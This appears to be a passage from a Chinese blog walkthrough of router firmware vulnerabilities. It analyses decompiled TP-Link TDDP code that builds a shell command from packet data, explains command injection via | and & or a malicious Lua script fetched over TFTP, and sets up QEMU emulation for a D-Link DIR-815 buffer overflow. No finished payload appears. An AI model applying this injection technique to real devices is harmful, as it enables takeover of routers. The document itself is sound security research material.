<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A580</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v1; <span class="comment">// r0</span></span><br><span class="line">  __int16 v2; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  __int64 v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> name[<span class="number">64</span>]; <span class="comment">// [sp+8h] [bp-E4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">64</span>]; <span class="comment">// [sp+48h] [bp-A4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [sp+88h] [bp-64h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+C8h] [bp-24h]</span></span><br><span class="line">  _BYTE *v13; <span class="comment">// [sp+CCh] [bp-20h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+D0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+D4h] [bp-18h]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [sp+D8h] [bp-14h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [sp+DCh] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [sp+E0h] [bp-Ch]</span></span><br><span class="line">  <span class="type">char</span> *v19; <span class="comment">// [sp+E4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v18 = <span class="number">1</span>;</span><br><span class="line">  v17 = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="keyword">sizeof</span>(v10));</span><br><span class="line">  v1 = <span class="built_in">memset</span>(name, <span class="number">0</span>, <span class="keyword">sizeof</span>(name));</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v15 = luaL_newstate(v1);</span><br><span class="line">  v19 = (<span class="type">char</span> *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v14 = a1 + <span class="number">82</span>;</span><br><span class="line">  v13 = (_BYTE *)(a1 + <span class="number">45083</span>);</span><br><span class="line">  v12 = a1 + <span class="number">82</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">83</span>) = <span class="number">49</span>;</span><br><span class="line">  *(_DWORD *)(v12 + <span class="number">4</span>) = htonl(<span class="number">0</span>);</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">2</span>) = <span class="number">2</span>;</span><br><span class="line">  v2 = ((<span class="type">unsigned</span> __int8)v13[<span class="number">9</span>] &lt;&lt; <span class="number">8</span>) | (<span class="type">unsigned</span> __int8)v13[<span class="number">8</span>];</span><br><span class="line">  v3 = v12;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">8</span>) = v13[<span class="number">8</span>];</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">9</span>) = HIBYTE(v2);</span><br><span class="line">  <span class="keyword">if</span> ( *v13 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">12</span>;</span><br><span class="line">    v14 += <span class="number">12</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v19 += <span class="number">28</span>;</span><br><span class="line">    v14 += <span class="number">28</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v19 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  <span class="built_in">sscanf</span>(v19, <span class="string">&quot;%[^;];%s&quot;</span>, s, v10);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] || !v10[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] luaFile or configFile len error.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">555</span>);</span><br><span class="line">LABEL_20:</span><br><span class="line">    *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> error(<span class="number">-10303</span>, <span class="string">&quot;config set failed&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = inet_ntoa(*(<span class="keyword">struct</span> in_addr *)(a1 + <span class="number">4</span>));</span><br><span class="line">  sub_91DC(<span class="string">&quot;cd /tmp;tftp -gr %s %s &amp;&quot;</span>, s, v16);</span><br><span class="line">  <span class="built_in">sprintf</span>(name, <span class="string">&quot;/tmp/%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">while</span> ( v17 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">1u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !access(name, <span class="number">0</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    --v17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] lua file [%s] don&#x27;t exsit.\n&quot;</span>, <span class="string">&quot;tddp_cmd_configSet&quot;</span>, <span class="number">574</span>, name);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v15 )</span><br><span class="line">  &#123;</span><br><span class="line">    luaL_openlibs(v15);</span><br><span class="line">    v4 = luaL_loadfile(v15, name);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v4 = lua_pcall(v15, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    lua_getfield(v15, <span class="number">-10002</span>, <span class="string">&quot;config_test&quot;</span>, v4);</span><br><span class="line">    lua_pushstring(v15, v10);</span><br><span class="line">    lua_pushstring(v15, v16);</span><br><span class="line">    lua_call(v15, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">    v5 = lua_tonumber(v15, <span class="number">-1</span>);</span><br><span class="line">    v18 = sub_16EC4(v5, HIDWORD(v5));</span><br><span class="line">    lua_settop(v15, <span class="number">-2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  lua_close(v15);</span><br><span class="line">  <span class="keyword">if</span> ( v18 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  *(_BYTE *)(v12 + <span class="number">3</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当<code>TDDP</code>协议是<code>Version 1</code>的时候，<code>v18</code>会从<code>TDDP</code>包的首地址往后移<code>12</code>个字节，也就是<strong>从“报头”移动到“数据”的首地址</strong>接着就到了一个<code>sscanf</code>函数：</p>
<p>这个<code>sscanf</code>函数将传进来的<code>TDDP</code>包数据区按照分离符<code>;</code>分为<code>s</code>和<code>v9</code>两个字符串，其中利用正则表达式过滤了<code>s</code>中的<code>;</code>，之后，字符串<code>s</code>拼接到了<code>cd /tmp;tftp -gr</code>的后面，这显然是一个<code>shell</code>命令，而<code>s</code>拼接上去很可能就导致了任意命令的执行，我们来看<code>sub_91DC</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_91DC</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv; <span class="comment">// [sp+8h] [bp-11Ch] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// [sp+Ch] [bp-118h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [sp+10h] [bp-114h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [sp+14h] [bp-110h]</span></span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [sp+18h] [bp-10Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [sp+1Ch] [bp-108h] BYREF</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [sp+11Ch] [bp-8h]</span></span><br><span class="line">  va_list varg_r1; <span class="comment">// [sp+12Ch] [bp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(varg_r1, a1);</span><br><span class="line">  pid = <span class="number">0</span>;</span><br><span class="line">  stat_loc = <span class="number">0</span>;</span><br><span class="line">  argv = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">vsprintf</span>(s, a1, varg_r1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[%s():%d] cmd: %s \r\n&quot;</span>, <span class="string">&quot;tddp_execCmd&quot;</span>, <span class="number">72</span>, s);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span> ( pid &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !pid )</span><br><span class="line">  &#123;</span><br><span class="line">    argv = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">    v4 = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">    v5 = s;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, &amp;argv, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">127</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( waitpid(pid, &amp;stat_loc, <span class="number">0</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *_errno_location() != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可见，这里的确就是一个<code>shell</code>命令的执行，有两种利用方式：</p>
<p>1.字符串<code>s</code>在<code>sscanf</code>分离的时候仅过滤了<code>;</code>，而 <strong><code>|</code>和<code>&amp;</code> 也可以作为连接符，对两句独立命令进行连接</strong>。</p>
<p>2.<code>tftp -gr ...</code>命令是利用<code>FTP</code>协议，从<code>...</code>路径下载文件，在这里是保存到<code>/tmp</code>目录下,而后面的<code>v4 = luaL_loadfile(v15, name);</code>函数对<code>Lua</code>脚本进行加载运行。</p>
<p>因此，我们若是想<strong>传一个路径到字符串<code>s</code>中</strong>也是可以的，不过<strong>需要先搭建<code>TFTP Server</code>，然后在某目录下放一个可执行恶意命令的<code>Lua</code>脚本文件</strong>。</p>
<h2 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h2><p>启动脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sudo qemu-system-arm \</span><br><span class="line">    -M vexpress-a9 \</span><br><span class="line">    -kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">    -initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">    -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span> \</span><br><span class="line">    -net nic -net tap,ifname=tap0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure>
<h1 id="DIR-815缓冲区溢出"><a href="#DIR-815缓冲区溢出" class="headerlink" title="DIR-815缓冲区溢出"></a>DIR-815缓冲区溢出</h1><p>漏洞报告<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/33863">D-Link Devices - ‘hedwig.cgi’ Remote Buffer Overflow in Cookie Header (Metasploit) - Hardware remote Exploit (exploit-db.com)</a></p>
<p>固件包下载<a target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-815/REVA/FIRMWARE/">legacyfiles.us.dlink.com - /DIR-815/REVA/FIRMWARE/</a></p>
<h2 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h2><p>通过随便查看提取出来的文件包里的二进制文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-28_221409.png" alt=""></p>
<p>确认这是32位小端序mipsl</p>
<p>到<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/">Index of /~aurel32/qemu (debian.org)</a>拉取文件系统与kernel镜像</p>
<p>因为是小端序的所以选择<code>debian_squeeze_mipsel_standard.qcow2</code>与<code>vmlinux-3.2.0-4-4kc-malta</code></p>
<p>首先依然是网络配置,还是老几样</p>
<ol>
<li>创建一个虚拟网桥,并分配地址</li>
<li>创建一个tap设备,并分配地址并将其添加到虚拟网桥中作为接口</li>
<li>启动脚本中指定tap设备,并在虚拟机中为网络设备分配地址</li>
</ol>
<p>启动脚本如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">-M malta \</span><br><span class="line">-kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">-hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">-append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> \</span><br><span class="line">-net nic \</span><br><span class="line">-net tap,ifname=tap0 \</span><br><span class="line">-nographic \</span><br></pre></td></tr></table></figure>
<p>然后这题看别的博客还提到需要打开物理机转换功能,不是很清楚但以防万一也跟着做一下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -X</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">sudo iptables -t nat -X</span><br><span class="line">sudo iptables -t mangle -F</span><br><span class="line">sudo iptables -t mangle -X</span><br><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE</span><br><span class="line">sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT</span><br><span class="line">sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
<p>此外,这题环境需要用到http配置服务</p>
<p>现在提取出来的文件系统中存放一个配置文件http_conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile /var/run/httpd.pid</span><br><span class="line">LogGMT On  </span><br><span class="line">ErrorLog /log </span><br><span class="line"> </span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text/html    &#123; html htm &#125;</span><br><span class="line">        text/xml    &#123; xml &#125;</span><br><span class="line">        text/plain    &#123; txt &#125;</span><br><span class="line">        image/gif    &#123; gif &#125;</span><br><span class="line">        image/jpeg    &#123; jpg &#125;</span><br><span class="line">        text/css    &#123; css &#125;</span><br><span class="line">        application/octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; /dump &#125;</span><br><span class="line">        CGI            &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        /usr/sbin/phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">Server</span><br><span class="line">&#123;</span><br><span class="line">    ServerName &quot;Linux, HTTP/1.1, &quot;</span><br><span class="line">    ServerId &quot;1234&quot;</span><br><span class="line">    Family inet</span><br><span class="line">    Interface eth0 #对应qemu仿真路由器系统的网卡</span><br><span class="line">    Address 192.168.234.3 #qemu仿真路由器系统的IP</span><br><span class="line">    Port &quot;1234&quot; #对应未被使用的端口</span><br><span class="line">    Virtual</span><br><span class="line">    &#123;</span><br><span class="line">        AnyHost</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /          #服务器目录</span><br><span class="line">            Location /htdocs/web        #源</span><br><span class="line">            IndexNames &#123; index.php &#125;</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/phpcgi &#123; router_info.xml &#125;</span><br><span class="line">                /usr/sbin/phpcgi &#123; post_login.xml &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Control</span><br><span class="line">        &#123;</span><br><span class="line">            Alias /HNAP1</span><br><span class="line">            Location /htdocs/HNAP1</span><br><span class="line">            External</span><br><span class="line">            &#123;</span><br><span class="line">                /usr/sbin/hnap &#123; hnap &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            IndexNames &#123; index.hnap &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>且由于环境的问题,我们之后将服务的运行切换到模拟的qemu根目录</p>
<p>使用脚本</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">cp</span> http_conf /</span><br><span class="line"><span class="built_in">cp</span> sbin/httpd /</span><br><span class="line"><span class="built_in">cp</span> -rf htdocs/ /</span><br><span class="line"><span class="built_in">mkdir</span> /etc_bak</span><br><span class="line"><span class="built_in">cp</span> -r /etc /etc_bak</span><br><span class="line"><span class="built_in">rm</span> /etc/services</span><br><span class="line"><span class="built_in">cp</span> -rf etc/ /</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so.1  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/ld-uClibc.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libcrypt.so.0  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libgcc_s.so  /lib/</span><br><span class="line"><span class="built_in">cp</span> lib/libuClibc-0.9.30.1.so  /lib/</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">rm</span> -rf /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/sbin/hnap</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /htdocs/web/hedwig.cgi</span><br><span class="line"><span class="built_in">ln</span> -s /htdocs/cgibin /usr/sbin/phpcgi</span><br><span class="line"><span class="built_in">ln</span> -s  /htdocs/cgibin /usr/sbin/hnap</span><br><span class="line">./httpd -f http_conf</span><br></pre></td></tr></table></figure>
<p>因为修改了<code>etc</code>文件,所以退出之前记得还原</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> -rf /etc</span><br><span class="line"><span class="built_in">mv</span> /etc_bak/etc /etc</span><br><span class="line"><span class="built_in">rm</span> -rf /etc_bak</span><br></pre></td></tr></table></figure>
<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据报告可以知道漏洞出在hedwig.cgi中,但可以发现这其实是指向cgibin的软连接</p>
<p>ida打开文件后看到main仅仅是匹配参数并跳转</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;hedwig.cgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())hedwigcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<code>gedwigcgi_main</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  v0 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;no REQUEST&quot;</span>;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">LABEL_34:</span><br><span class="line">    v9 = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( strcasecmp(v0, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unsupported HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">  cgibin_parse_request(sub_409A6C, <span class="number">0</span>, <span class="number">0x20000</span>);</span><br><span class="line">  v2 = fopen(<span class="string">&quot;/etc/config/image_sign&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(v26, <span class="number">128</span>, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="string">&quot;unable to read 